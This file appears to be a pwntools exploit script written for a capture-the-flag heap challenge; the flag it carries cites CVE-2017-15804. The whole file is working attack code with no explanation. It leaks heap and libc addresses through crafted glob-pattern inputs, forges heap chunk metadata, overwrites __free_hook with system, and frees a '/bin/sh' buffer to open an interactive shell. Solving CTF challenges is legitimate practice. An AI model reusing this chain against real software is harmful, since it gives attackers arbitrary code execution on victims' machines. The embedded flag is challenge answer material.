#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn.challenge.bi0s.in"
PORT = 1299
PROCESS = "./chall"

COUNT = 0

def add(idx, size, path):
	global COUNT
	COUNT+=1
	log.info("Add : %d" % COUNT)
	r.sendline("1")
	r.sendlineafter(">> ", str(idx))
	r.sendlineafter(">> ", str(size))
	r.sendafter(">> ", path)
	r.recvuntil(">> ")

def view(idx):
	r.sendline("3")
	r.sendlineafter(">> ", str(idx))
	r.recvuntil(": ")
	LEAK = r.recvuntil("\n ----", drop=True)
	r.recvuntil(">> ")
	return LEAK

def rem(idx):
	r.sendline("4")
	r.sendlineafter(">> ", str(idx))
	r.recvuntil(">> ")

def check(idx):
	r.sendline("2")
	r.sendlineafter(">> ", str(idx))
	LEAK = r.recvuntil("\n ----", drop=True)
	r.recvuntil(">> ")
	return LEAK

# inctf{CVE-2017-15804_Subtl3_H3ap_Overfl0w}
def exploit(r):
	r.recvuntil(">> ")
	
	payload = '~\S////////////////////////S\x00'
	
  	add(0, 0x290-8, payload)
  	add(1, 0x18, 'HKHK')
  	add(2, 0x600-8, 'HKHK')
  	rem(1)
  	check(0)
  	rem(0)
  	
  	add(1, 32, "\n")
	
  	HEAPLEAK = u64(view(1))

  	if not LOCAL:
  		HEAPLEAK += 0x900

  	log.info("HEAP leak      : %s" % hex(HEAPLEAK))

  	payload = "/bin/sh\x00"
  	payload += "A"*(0x20-len(payload))
  	payload += p64(0x0) + p64(0x281)
	payload += p64(HEAPLEAK - 0x1a10-0x18) + p64(HEAPLEAK-0x1a10-0x10)
  	payload += p64(0) + p64(0)
  	payload += p64(HEAPLEAK-0x1a40)
  	
  	add(0, 0x290-8, payload)

  	payload = p64(0x0) + p64(0x0)
  	payload += p64(0x280)

  	add(3, 0x20-8, payload)

  	rem(2)

  	add(4, 0x290-8, "\n")

  	LIBCLEAK = u64(view(4))
  	libc.address = LIBCLEAK - 0x1ec000

  	log.info("LIBC leak     : %s" % hex(LIBCLEAK))
  	log.info("LIBC          : %s" % hex(libc.address))
  	add(5, 0x290-8, "\n")

  	rem(5)
	rem(4)  	
	rem(0)

	payload = "/bin/sh\x00"
  	payload += "A"*(0x20-len(payload))  	
	payload += p64(0x0) + p64(0x291)
	payload += p64(libc.symbols["__free_hook"])

	add(0, 0x290-8, payload)
	add(4, 0x290-8, "AAAA")
	add(5, 0x290-8, p64(libc.symbols["system"]))

	r.sendline("4")
	r.sendline("0")

	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./chall")
	libc = ELF("./libc.so.6")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./chall")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)

